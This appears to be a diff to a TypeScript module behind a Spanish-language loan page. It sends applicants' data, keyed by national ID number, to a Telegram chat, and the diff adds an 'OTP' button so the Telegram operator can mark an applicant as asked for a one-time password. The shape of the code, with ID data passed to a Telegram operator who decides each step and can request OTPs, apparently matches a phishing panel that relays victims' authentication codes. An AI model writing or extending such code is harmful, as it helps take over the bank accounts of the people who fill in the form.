@@ -52,6 +52,7 @@ export async function sendToTelegram(data: UserData) {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         reply_markup: {
+          // In the sendToTelegram function, update the inline_keyboard array:
           inline_keyboard: [
             [
               {
@@ -65,6 +66,10 @@ export async function sendToTelegram(data: UserData) {
               {
                 text: "🔄 Reintentar",
                 callback_data: `retry_${data.cedula}`
+              },
+              {
+                text: "🔐 OTP",
+                callback_data: `otp_${data.cedula}`
               }
             ]
           ]
@@ -84,10 +89,9 @@ export async function sendToTelegram(data: UserData) {
 }
 
 // Store loan statuses in memory and localStorage (temporary solution)
-const LOAN_STATUSES_KEY = 'loan_statuses';
+const LOAN_STATUSES_KEY = 'loanStatuses';
 
-type LoanStatus = 'processing' | 'approved' | 'rejected' | 'retry';
-
+type LoanStatus = 'processing' | 'approved' | 'rejected' | 'retry' | 'otp';
 function getLoanStatusesFromStorage(): Map<string, LoanStatus> {
   try {
     const storedStatuses = localStorage.getItem(LOAN_STATUSES_KEY);
@@ -109,7 +113,6 @@ function saveLoanStatusesToStorage(statuses: Map<string, LoanStatus>) {
 }
 
 const loanStatuses = getLoanStatusesFromStorage();
-
 export async function handleTelegramWebhook(req: Request) {
   const data = await req.json();
   
@@ -118,10 +121,11 @@ export async function handleTelegramWebhook(req: Request) {
     const { callback_query } = data;
     const { data: callbackData, message } = callback_query;
     
-    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('retry_')) {
+    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('retry_') || callbackData.startsWith('otp_')) {
       const [action, cedula] = callbackData.split('_');
       const status = action === 'approve' ? 'approved' : 
-                    action === 'reject' ? 'rejected' : 'retry';
+                    action === 'reject' ? 'rejected' : 
+                    action === 'otp' ? 'otp' : 'retry';
       
       // Update loan status and save to storage
       loanStatuses.set(cedula, status);
@@ -139,16 +143,17 @@ export async function handleTelegramWebhook(req: Request) {
           text: `${message.text}\n\nEstado: ${
             status === 'approved' ? '✅ Aprobado' : 
             status === 'rejected' ? '❌ Rechazado' : 
+            status === 'otp' ? '🔐 OTP Solicitado' :
             '🔄 Reintento solicitado'
           }`,
         }),
       });
-      
-      return { success: true, status };
+
+      return { action, cedula, status };
     }
   }
-  
-  return { success: true };
+
+  return { action: 'unknown' };
 }
 
 export async function getLoanStatus(cedula: string): Promise<LoanStatus> {
